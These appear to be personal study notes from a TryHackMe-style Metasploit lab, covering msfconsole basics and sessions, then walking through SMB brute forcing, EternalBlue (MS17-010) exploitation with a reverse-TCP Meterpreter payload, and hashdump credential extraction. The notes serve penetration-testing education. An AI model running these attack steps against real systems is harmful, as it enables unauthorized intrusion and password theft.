# Metasploit Framework
Comprehensive guide to Metasploit penetration testing tools and exploitation techniques (Aug 2026)

## Overview
So it is mainly focused on penetration testing. It is set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation and more.
Main components of the metasploit framework is:-
- msfconsole: main command line interface
- modules: supporting modules such as exploits, scanners, payloads etc.

***Some terms***

**Exploitation:** Using the flaw or vulnerability to gain unauthorized access.
**Payload:** These are codes that will run on the target system.

The metasploit console can be used just like a regular command-line shell.

***Key Navigation commands:***
- `search <term>` -> finds modules in metasploit's database.
- `use <name or #>` -> selects an exploit or scanner to work with.
- `show options` -> lists all settings required to run the current module (IPs, ports, target OS)
- `set <option> <val>` -> configure a required setting (eg: set RHOSTS TARGET_IP)
- `info` -> shows full details about the active module (who wrote it, how it works, CVE numbers)
- `show payloads` -> lists all compatible malicious code options you can send to the target once exploited.

There are 5 command prompts we need to check :-
- `root@ip-<val>:~#` -> linux terminal
- `msf6>` -> metasploit main menu
- `msf6 exploit(...)>` -> module content
- `meterpreter>` -> meterpreter context
- `C:\Windows\system32>` -> target os shell

***Core metasploit variables:***

- **RHOSTS:**  remote host -> the target machine's IP address (set RHOSTS TARGET_IP)
- **RPORT:**  remote port -> the port running the target services (set RPORT 445)
- **LHOST:** local host -> Our attacking machine's IP addr (set LHOST YOUR_IP)
- **LPORT:**  local port -> the open port on our machine waiting for the incoming connection (set LPORT 4444)
- **PAYLOAD:** the specific shell code delivered to target once the vulnerability is triggered (set PAYLOAD windows/x64/meterpreter/reverse_tcp)

***Management & Global commands:***

- `unset <option>/ unset all`:  clears a specific variable or resets all variables in the active module (unset PAYLOAD -> clear a set payload)
- `setg <option> <value>`:  Sets a Global Variable. If we set setg RHOSTS TARGET_IP, Metasploit automatically populates RHOSTS for every module we load afterward until we exit msfconsole. (setg RHOSTS TARGET_IP)
- `exploit (or run)`:  Launches the active attack.
- `exploit -z`:  Runs the exploit and automatically puts the new connection into the background without dropping us straight into the interactive shell.

***Managing Sessions (Connections):***
When an exploit succeeds, it opens an active Session (a live tunnel between our PC and the victim):
- `background (or CTRL+Z)`: Temporarily leaves an active session without closing it, putting us back in the Metasploit terminal.
- `sessions`: Lists all open, active compromised connections on target hosts.
- `sessions -i <ID>`: Re-enters a backgrounded session (e.g., sessions -i 2 jumps back into Session #2).


***EternalBlue Example***
Successfully demonstrated MS17-010 exploitation using Metasploit:
- Used `exploit/windows/smb/ms17_010_eternalblue` module
- Gained SYSTEM shell via Meterpreter
- Demonstrated process enumeration and system information gathering


Now, we will start by port scanning for metasploit.

```bash
search portscan
```
We can do nmap on the target or use any of the listed in above command. Something important things to note that nmap scan 1000 most used ports, while metasploit will scan port numbers from 1 to 10000.

```bash
nmap -sS <IP>
```
The flag '-sS' enables a TCP SYN scan, which is commonly known as stealth scan or half-open scan. Unlike a full 3 way handshake, it intentionally cuts the connection. It sends a SYN packet to specific port:-
- If the port is open then it sends SYN/ACK packet.
- If the port is closed, the target responds with a RST packet.
- If the target is protected by firewall, the packet is often dropped, resulting in a filtered status.

After scanning the target we find netBIOS name using the module `auxiliary/scanner/netbios/nbname`. NetBIOS is just the computer name on Windows/SMB network.
NetBIOS is an old windows networking protocol. Every windows computer broadcasts its name via NetBIOS on the network.
The NetBIOS name reveals:
- Computer name -> what is this machine called?
- Workgroup/Domain -> Which network does it belong to?
- Services running -> What's available on the network?
It matters for cybersecurity:
- Identifies target (we now know what machine we are attacking)
- Reconnaissance (gather info about the network)
- Social engineering (computer name can hint at purpose or owner) 

After that brute forcing in smb over port 445 using module `auxiliary/scanner/smb/smb_login`, and set following things that needed for this attack.
```bash
$ set RHOSTS <IP>
$ set SMBUser "penny"
$ set PASS_FILE MetasploitWordlist-1632491116676.txt
$ run
```

It will reveal the password by brute forcing from the wordlists.


### Metasploit database 
Why we use it?

When we are doing a real penetration test with 10+ targets, mananging IPs, open ports and finding manually is chaos.

**Database setup**
- postgresql stores all our scan data.
- `msfdb init` -> initializes it
- `db_status` -> checks if connected.

**Workspaces**
- Separate projects/clients into different workspaces.
- Each workspaces -> isolated data
```bash
workspace -a tryhackme  # create new workspace
workspace tryhackme     # switch to it
workspace               # list all
workspace -d tryhackme  # deletes the database
```

**Automated Scanning & Storage**
- db_nmap runs nmap and automatically saves results
- All hosts, ports, services stored in database
- No manual copy-pasting
```bash
db_nmap -sV -p- <Target_IP>
```

**Querying Results**
- hosts -> List all discovered hosts
- services -> List all open services
- services -S netbios -> Search for specific services

**Quick Target Selection**
- hosts -R -> Automatically sets RHOSTS from database
- No manual IP entry needed

example:-
```bash
msf6 > db_nmap -sV <Target_IP>               # Scan and save
msf6 > services -S microsoft-ds              # Find SMB hosts
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > hosts -R                              # Auto-set RHOSTS
msf6 > run                                   # Scan all hosts at once
```

We can also use different types of payloads to execute in target machine:
```bash
show payloads    # it will list all payloads for any module
```

Once we decided a payload, we can use
```bash
set payload <number from the list>
```

Some payloads may need to set new parameters, running `show options` will list those.
After executing a payload to the target, we can abort it (ctrl C) or background it (ctrl Z).

```bash
$ sessions
```
The above command will list all active sessions. we can use `sessions -h` which can help us manage sessions. We can use `sessions -i <Id>` to interact with any existing session.

So now we will exploit port 445 or port 139, where MS17-010 affects both.

```bash
$ search MS17-010
$ use exploit/windows/smb/ms17_010_eternalblue
$ show options
$ set RHOSTS <target_IP>
$ set LHOST <Your IP>
$ run
```
After gaining cmd shell, run:
```bash
$ cd C:\\
$ cd Users
$ cd Jon
$ dir flag.txt /s
```
After that we use another payload for using meterpreter
```bash
$ use payload 30
$ cd /
$ hashdump
```